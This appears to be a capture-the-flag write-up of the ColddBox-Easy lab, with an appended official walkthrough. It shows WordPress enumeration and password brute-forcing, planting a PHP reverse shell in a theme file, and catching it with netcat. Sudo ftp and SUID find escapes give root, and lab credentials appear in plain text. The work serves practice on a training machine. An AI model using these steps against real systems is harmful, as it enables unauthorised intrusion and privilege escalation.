---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.201.239 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-16 06:30 +0900
Nmap scan report for 192.168.201.239
Host is up (0.100s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   99.58 ms 192.168.45.1
2   99.58 ms 192.168.45.254
3   99.43 ms 192.168.251.1
4   99.73 ms 192.168.201.239

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.48 seconds
```

# HTTP
## 80
![](../../../assets/images/Pasted%20image%2020260516063944.png)

![](../../../assets/images/Pasted%20image%2020260516072615.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ whatweb -a 3 http://192.168.201.239
http://192.168.201.239 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.201.239], JQuery[1.11.1], MetaGenerator[WordPress 4.1.31], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[ColddBox | One more machine], WordPress[4.1.23,4.1.24,4.1.25,4.1.31], x-pingback[/xmlrpc.php]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ feroxbuster \
-u http://192.168.201.239/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
-x php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt

--scan-dir-listings to scan)
[####################] - 11m   159504/159504  243/s   http://192.168.201.239/wp-content/ 
[####################] - 11m   159504/159504  243/s   http://192.168.201.239/hidden/   
```

http://192.168.201.239/hidden
![](../../../assets/images/Pasted%20image%2020260516070443.png)

```zsh
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ wpscan --url http://192.168.201.239/ --enumerate vp,u,vt,tt --verbose

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

valid users
- c0ldd
- hugo
- philip

---

# Initial Access


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ wpscan --url http://192.168.201.239/ --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,hugo,philip

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210 
```
![](../../../assets/images/Pasted%20image%2020260516095454.png)

![](../../../assets/images/Pasted%20image%2020260516105248.png)

http://192.168.201.239/wp-content/themes/twentyfifteen/404.php
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ rlwrap -cAr nc -lvnp 443   
listening on [any] 443 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.201.239] 45478
Linux ColddBox-Easy 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:27:33 up 55 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ hostname
ColddBox-Easy
```

```zsh
$ cat local.txt

$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:6c:84 brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.239/24 brd 192.168.201.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:6c84/64 scope link 
       valid_lft forever preferred_lft forever
```

---

# Privilege Escalation

```zsh
www-data@ColddBox-Easy:/tmp$ wget http://192.168.45.240:8000/linpeas.sh 
wget http://192.168.45.240:8000/linpeas.sh 
--2026-05-16 04:45:40--  http://192.168.45.240:8000/linpeas.sh
Connecting to 192.168.45.240:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1031313 (1007K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>]   1007K   300KB/s    in 3.6s    

2026-05-16 04:45:44 (282 KB/s) - 'linpeas.sh' saved [1031313/1031313]

www-data@ColddBox-Easy:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@ColddBox-Easy:/tmp$ ./linpeas.sh 
./linpeas.sh
```

```zsh

```
![](../../../assets/images/Pasted%20image%2020260516115542.png)

```zsh
╔══════════╣ Sudo version (T1548.003,T1068)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                 
Sudo version 1.8.16
```
![](../../../assets/images/Pasted%20image%2020260516115019.png)

```zsh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3056 Oct 14  2020 /var/www/html/wp-config.php                                                                   
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');
```
![](../../../assets/images/Pasted%20image%2020260516115442.png)

```zsh
Enter password: cybersecurity

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 27504
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databses;

show databases;
+--------------------+
| Database           |
+--------------------+
| colddbox           |
| information_schema |
+--------------------+
2 rows in set (0.01 sec)

MariaDB [colddbox]> show tables;
show tables;
+-----------------------+
| Tables_in_colddbox    |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

MariaDB [colddbox]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
|  1 | c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
|  2 | hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
|  4 | philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
3 rows in set (0.01 sec)
```

```zsh
www-data@ColddBox-Easy:/$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/$

c0ldd@ColddBox-Easy:/$ cd /home/c0ldd
cd /home/c0ldd
c0ldd@ColddBox-Easy:~$ ls
ls
local.txt  user.txt
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
c0ldd@ColddBox-Easy:~$ echo RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ== | base64 -d
< RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ== | base64 -d           
Felicidades, primer nivel conseguido!
c0ldd@ColddBox-Easy:~$ 
```
Felicidades, primer nivel conseguido!(Congratulations on reaching the first level!)
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/ColdBoxEasy]
└─$ ssh c0ldd@192.168.201.239 -p 4512   
The authenticity of host '[192.168.201.239]:4512 ([192.168.201.239]:4512)' can't be established.
ED25519 key fingerprint is: SHA256:4Burx9DOSmBG9A0+DFqpM7rY4cyqpq59iluJwKx690c
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.201.239]:4512' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
c0ldd@192.168.201.239's password: 
Permission denied, please try again.
c0ldd@192.168.201.239's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon Oct 19 18:48:20 2020 from 10.0.1.4
```

```zsh
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```
/usr/bin/ftp

![](../../../assets/images/Pasted%20image%2020260516131911.png)


```bash
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> !/bin/sh
# id
uid=0(root) gid=0(root) grupos=0(root)
# cat /root/proof.txt

```

```bash
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:c2:75 brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.239/24 brd 192.168.201.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:c275/64 scope link 
       valid_lft forever preferred_lft forever

```

<details>

<sumaryWalkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Colddbox
Summary:
In this guide, we will identify an outdated version of wordpress and bruteforce credentials in order to gain intial access. Once on the machine, we will take advantage of a vulnerable SUID binary in order to obtain root access.

Enumeration:
We begin the enumeration process with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ nmap -T4 10.10.3.123
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-21 06:54 EST
Nmap scan report for 10.10.3.123
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
From the output we a see a webserver on port 80 open and running.

Turning to nikto we discover a /hidden directory.

┌──(kali㉿kali)-[~]
└─$ nikto -h 10.10.3.123                  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.3.123
+ Target Hostname:    10.10.3.123
+ Target Port:        80
+ Start Time:         2022-12-21 06:54:48 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /hidden/: This might be interesting...
...
Navigating to the target IP on our web browser reveals the a simple wordpress page.

Navigating to /hidden reveals the following users: c0ldd,philip, and hugo

Turning to wpscan, we discover an outdated wordpress version: 4.1.31

┌──(kali㉿kali)-[~]
└─$ wpscan --url 10.10.3.123                
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://10.10.3.123/ [10.10.3.123]
[+] Started: Wed Dec 21 06:55:19 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.3.123/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.3.123/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.3.123/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.3.123/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.3.123/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</genera

Continuing with wpscan, we enumerate for any users.

                                                                                                
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.3.123 -e   
.....

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
Confirming the users we found earlier in the /hidden directory.

We proceed with attempting to bruteforce using the users we've discovered in tandem with the rockyou.txt list.

┌──(kali㉿kali)-[~]
└─$ wpscan --no-banner --url http://10.10.3.123 --usernames hugo,c0ldd,philip --passwords  /usr/share/wordlists/rockyou.txt
.....
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
The output reveals the crednetials c0ldd:9876543210, which we use to successfully login to wordpress.

From here we will browse to Appearance -> Editor and select the Twenty fifteen theme.

We'll replace the 404.php file with the PHP reverse shell from /usr/share/webshells/php/php-reverse-shell.php.

First we need to modify lines 49 and 50 with the proper IP address and the desired port number.

┌──(kali㉿kali)-[~]
└─$ cat php-reverse-shell.php -n
     1  ?php
     2  // php-reverse-shell - A Reverse Shell implementation in PHP
     ...
    48  $VERSION = "1.0";
    49  $ip = '192.168.118.14';  // CHANGE THIS
    50  $port = 4444;       // CHANGE THIS
    51  $chunk_size = 1400;
    ...
We paste the contents of our updated php-reverse-shell.php file and upload the PHP reverse shell to the target.

Now we start a Netcat listener.

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                   
listening on [any] 4444 ...
We then browse to our updated 404.php shell in order to catch the reverse shell.

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                   
listening on [any] 4444 ...
....
/bin/sh: 0: can't access tty; job control turned off
$ 
Privilege Escalation
Once on the box we check for any interesting SUID binaries.

www-data@ColddBox-Easy:/$ find / -type f -perm -4000 2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find  
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
Turning to GTFObins, we find the following: https://gtfobins.github.io/gtfobins/find/

Simply entering the payload find . -exec /bin/sh -p \; -quit allows us to obtain root access.

www-data@ColddBox-Easy:/$ find . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
#

```
</details>